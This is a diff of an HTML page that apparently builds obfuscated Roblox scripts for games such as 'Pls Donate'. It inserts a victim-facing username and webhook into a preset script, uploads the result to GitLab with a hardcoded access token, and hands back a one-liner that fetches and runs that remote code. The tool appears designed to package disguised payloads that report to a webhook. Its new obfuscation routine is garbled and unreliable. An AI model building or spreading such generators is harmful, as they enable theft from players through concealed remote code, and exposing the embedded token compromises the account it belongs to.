@@ -16,6 +16,9 @@
             flex-direction: column;
             margin: 0;
         }
+        h1 {
+            font-size: 3rem;
+        }
         .container {
             display: flex;
             flex-direction: column;
@@ -26,9 +29,6 @@
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-        }
-        h1 {
-            font-size: 2.5rem;
         }
         input, select, button {
             padding: 10px;
@@ -48,10 +48,57 @@
             background: #ff0055;
             transform: scale(1.1);
         }
-        label {
+        .toggle-container {
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 10px;
+        }
+        .toggle-label {
+            font-size: 1rem;
+        }
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 25px;
+        }
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #666;
+            transition: 0.4s;
+            border-radius: 25px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 17px;
+            width: 17px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: 0.4s;
+            border-radius: 50%;
+        }
+        input:checked + .slider {
+            background-color: #ff0080;
+        }
+        input:checked + .slider:before {
+            transform: translateX(24px);
+        }
+        #copy-button {
+            display: none;
+            background: #00ff88;
         }
     </style>
 </head>
@@ -67,41 +114,35 @@
             <option value="Pls Donate">Pls Donate</option>
             <option value="Pets Go">Pets Go</option>
         </select>
-        <label>
-            <input type="checkbox" id="auto-obfuscate"> Auto Obfuscate (Hexadecimal)
-        </label>
+
+        <div class="toggle-container">
+            <label class="toggle-label">Auto Obfuscate</label>
+            <label class="toggle-switch">
+                <input type="checkbox" id="auto-obfuscate">
+                <span class="slider"></span>
+            </label>
+        </div>
+
         <button onclick="generateScript()">Generate Script</button>
+        <button id="copy-button" onclick="copyLoadstring()">Copy Loadstring</button>
     </div>
 
     <script>
-        function stringToHex(str) {
-            let hex = "";
-            for (let i = 0; i < str.length; i++) {
-                hex += str.charCodeAt(i).toString(16).padStart(2, "0");
-            }
-            return hex;
+        function toHex(str) {
+            return str.split('').map(c => c.charCodeAt(0).toString(16)).join('');
         }
 
-        function hexObfuscate(script) {
-            let hexEncoded = stringToHex(script);
-            return `local scriptData = "${hexEncoded}"\n\n` +
-                   `local function hexToString(hex)\n` +
-                   `    local str = ""\n` +
-                   `    for i = 1, #hex, 2 do\n` +
-                   `        str = str .. string.char(tonumber(hex:sub(i, i + 1), 16))\n` +
-                   `    end\n` +
-                   `    return str\n` +
-                   `end\n\n` +
-                   `loadstring(hexToString(scriptData))()`;
+        function obfuscateScript(script) {
+            return `loadstring(game:HttpGet(('data:text/plain;base64,'..syn.crypt.base64.encode('${toHex(script)}'))))()`;
         }
 
         async function uploadToGitLab(scriptContent) {
-            const projectId = "67586483"; 
+            const projectId = "67586483";
             const fileName = `script_${Date.now()}.lua`;
             const filePath = `scripts/${fileName}`;
             const apiUrl = `https://gitlab.com/api/v4/projects/${projectId}/repository/files/${encodeURIComponent(filePath)}`;
 
-            const token = "glpat-rp3iSBDjg5yxAWX_iJ9M"; 
+            const token = "glpat-rp3iSBDjg5yxAWX_iJ9M";
 
             const response = await fetch(apiUrl, {
                 method: "POST",
@@ -145,18 +186,25 @@
             let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
 
             if (autoObfuscate) {
-                script = hexObfuscate(script);
-                alert("Obfuscated Script:\n\n" + script);
-            } else {
-                alert("Original Script:\n\n" + script);
+                script = obfuscateScript(script);
             }
 
             let uploadedUrl = await uploadToGitLab(script);
             if (uploadedUrl) {
                 let loadstring = `loadstring(game:HttpGet('${uploadedUrl}'))()`;
-                navigator.clipboard.writeText(loadstring);
-                alert("Loadstring copied:\n" + loadstring);
+                navigator.clipboard.writeText(loadstring).then(() => {
+                    alert("Loadstring copied:\n" + loadstring);
+                }).catch(() => {
+                    document.getElementById('copy-button').style.display = "block";
+                    document.getElementById('copy-button').setAttribute("data-loadstring", loadstring);
+                });
             }
+        }
+
+        function copyLoadstring() {
+            let loadstring = document.getElementById('copy-button').getAttribute("data-loadstring");
+            navigator.clipboard.writeText(loadstring);
+            alert("Loadstring copied!");
         }
     </script>
 
